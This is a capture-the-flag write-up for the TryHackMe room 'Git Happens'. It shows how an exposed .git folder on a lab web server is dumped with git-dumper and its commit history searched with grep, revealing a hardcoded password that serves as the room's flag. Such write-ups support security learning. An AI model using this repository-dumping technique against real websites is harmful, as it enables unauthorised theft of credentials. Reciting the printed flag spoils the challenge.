```
Title: "Git Happens"
URL: https://tryhackme.com/room/githappens
Difficulty : easy
Type : Unguided
Description: Boss wanted me to create a prototype, so here it is! We even used something called "version control" that made deploying this really easy!
```

ip : 10.10.107.45

I found a weird obfuscated javascript variable in the source, at first i tried to decode this manually. Although it seems that that will take way too much time.

Apparently, this was done with obfuscate.io and is irreversable. So not sure if this is a red-herring or not, but it didnt lead to anything.


The Nmap scan showed that there is a /.git/ folder in the webserver root. We can look around in this repository a little bit, but this is something i dont fully understand the structure off without GIT itself, so after some googling i encountered "Git-dumper" python script.

After installing it i ran git-dumper to fetch the entire repository:

``git-dumper http://10.10.107.45/ ./``

This dumps the entire .git folder into my local machine and allows me to use git itself to check. So instead of de-compiling the javascript code, lets see if they maybe commited a version with the password hardcoded in it:

  ```
  └─$ git log -p | grep "password"                                                                                                                                                                                                                                                                                                                                                                                                      130 ⨯
  +    - echo "{\"auths\":{\"$CI_REGISTRY\":{\"username\":\"$CI_REGISTRY_USER\",\"password\":\"$CI_REGISTRY_PASSWORD\"}}}" > /kaniko/.docker/config.json
  +    - echo "{\"auths\":{\"$CI_REGISTRY\":{\"username\":\"$CI_REGISTRY_USER\",\"password\":\"$CI_REGISTRY_PASSWORD\"}}}" > /kaniko/.docker/config.json
  -        let passwordHash = await digest(form.elements["password"].value);
  -          passwordHash === '4004c23a71fd6ba9b03ec9cb7eed08471197d84319a865c5442a9d6a7c7cbea070f3cb6aa5106ef80f679a88dbbaf89ff64cb351a151a5f29819a3c094ecebbb'
  -      async function digest(password) {
  -          const data = encoder.encode(`${password}SaltyBob`);
  +        let passwordHash = await digest(form.elements["password"].value);
  +          passwordHash === '4004c23a71fd6ba9b03ec9cb7eed08471197d84319a865c5442a9d6a7c7cbea070f3cb6aa5106ef80f679a88dbbaf89ff64cb351a151a5f29819a3c094ecebbb'
  +      async function digest(password) {
  +          const data = encoder.encode(`${password}SaltyBob`);
       <p class="rainbow-text">Awesome! Use the password you input as the flag!</p>
  -        let password = form.elements["password"].value;
  -          password === "Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!"
  +    <p class="rainbow-text">Awesome! Use the password you input as the flag!</p>
  +        <label class="lf--label" for="password">
  +          id="password"
  +          name="password"
  +          type="password"
  +        let password = form.elements["password"].value;
  +          password === "Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!"
```

Et Voilla, we can see the password clear as day. This is the flag
